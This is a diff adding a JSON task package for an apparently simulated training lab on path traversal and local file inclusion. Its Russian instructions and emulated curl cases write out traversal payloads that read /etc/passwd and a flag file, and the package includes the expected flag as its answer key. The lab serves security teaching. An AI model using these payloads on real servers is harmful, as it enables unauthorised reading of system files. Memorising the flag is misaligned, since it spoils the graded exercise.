@@ -1,0 +1,42 @@
+{
+  "id": "web-lfi-path-traversal",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{tr4v3rs4l_r34ds_3v3ry_f1l3}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: path traversal / LFI\n\nЦель — `http://shop.lab.local/download?file=`. Приложение отдаёт файл по имени.\nИмя проверяется плохо — можно выйти за пределы каталога.\n\n1. Обычный файл: `curl -s -i 'http://shop.lab.local/download?file=report.pdf'`.\n2. Выход в корень: `curl -s 'http://shop.lab.local/download?file=../../../../etc/passwd'`.\n3. Рядом с каталогом приложения (на уровень выше) лежит `flag.txt`:\n\n   curl -s -G 'http://shop.lab.local/download' --data-urlencode 'file=../flag.txt'\n\n4. Запиши флаг в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.lab.local/download)",
+      "cases": [
+        {
+          "match": "\\.\\./flag\\.txt",
+          "example": "-s -G http://shop.lab.local/download --data-urlencode 'file=../flag.txt'",
+          "output": "nto{tr4v3rs4l_r34ds_3v3ry_f1l3}\n"
+        },
+        {
+          "match": "etc/passwd",
+          "example": "-s 'http://shop.lab.local/download?file=../../../../etc/passwd'",
+          "output": "root:x:0:0::/root:/usr/bin/bash\nbin:x:1:1::/:/usr/bin/nologin\ndaemon:x:2:2::/:/usr/bin/nologin\nmail:x:8:12::/var/spool/mail:/usr/bin/nologin\nftp:x:14:11::/srv/ftp:/usr/bin/nologin\nhttp:x:33:33::/srv/http:/usr/bin/nologin\nnobody:x:65534:65534:Kernel Overflow User:/:/usr/bin/nologin\ndbus:x:81:81:System Message Bus:/:/usr/bin/nologin\nsystemd-coredump:x:978:978:systemd Core Dumper:/:/usr/bin/nologin\nsystemd-network:x:977:977:systemd Network Management:/:/usr/bin/nologin\nsystemd-oom:x:976:976:systemd Userspace OOM Killer:/:/usr/bin/nologin\nsystemd-journal-remote:x:975:975:systemd Journal Remote:/:/usr/bin/nologin\nsystemd-resolve:x:974:974:systemd Resolver:/:/usr/bin/nologin\nsystemd-timesync:x:973:973:systemd Time Synchronization:/:/usr/bin/nologin\ntss:x:972:972:tss user for tpm2:/:/usr/bin/nologin\nuuidd:x:971:971:UUID generator helper daemon:/var/lib/libuuid:/usr/bin/nologin\nalpm:x:970:970:Arch Linux Package Management:/:/usr/bin/nologin\nSerebr1k:x:1000:1000::/home/Serebr1k:/usr/bin/bash\ndhcpcd:x:969:969:dhcpcd privilege separation:/:/usr/bin/nologin\navahi:x:967:967:Avahi mDNS/DNS-SD daemon:/:/usr/bin/nologin\ngit:x:966:966:git daemon user:/:/usr/bin/git-shell\ngeoclue:x:964:964::/var/lib/geoclue:/usr/bin/nologin\nmihomo:x:963:963::/:/usr/bin/nologin\nsing-box:x:962:962:sing-box Service:/:/usr/bin/nologin\nxray:x:961:961:Xray Service:/:/usr/bin/nologin\npolkitd:x:102:102:User for polkitd:/:/usr/bin/nologin\npcscd:x:960:960:PC/SC Smart Card Daemon:/:/usr/bin/nologin\nrtkit:x:959:959:RealtimeKit:/:/usr/bin/nologin\nnvidia-persistenced:x:143:143:NVIDIA Persistence Daemon:/:/usr/bin/nologin\ntor:x:43:43::/var/lib/tor:/usr/bin/nologin\nzerotier-one:x:958:958:ZeroTier One user:/var/lib/zerotier-one:/usr/bin/nologin\nnamed:x:40:40:BIND DNS Server:/:/usr/bin/nologin\nzapret:x:957:957:zapret dpi bypasser:/:/usr/bin/nologin\nflatpak:x:956:956:Flatpak system helper:/:/usr/bin/nologin\ndnsmasq:x:954:954:dnsmasq daemon:/:/usr/bin/nologin\nusbmux:x:140:140:usbmux user:/:/usr/bin/nologin\norca:x:953:953::/home/orca:/usr/sbin/nologin\ntpws:x:952:952::/home/tpws:/bin/false\n"
+        },
+        {
+          "match": "report\\.pdf",
+          "example": "-s -i 'http://shop.lab.local/download?file=report.pdf'",
+          "output": "HTTP/1.1 200 OK\nServer: nginx/1.24.0\nContent-Type: application/octet-stream\nContent-Length: 51\n\n%PDF-1.4\n%����\n1 0 obj\n<< /Type /Catalog >>\nendobj\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /download на shop.lab.local (параметр file).\n"
+    }
+  }
+}
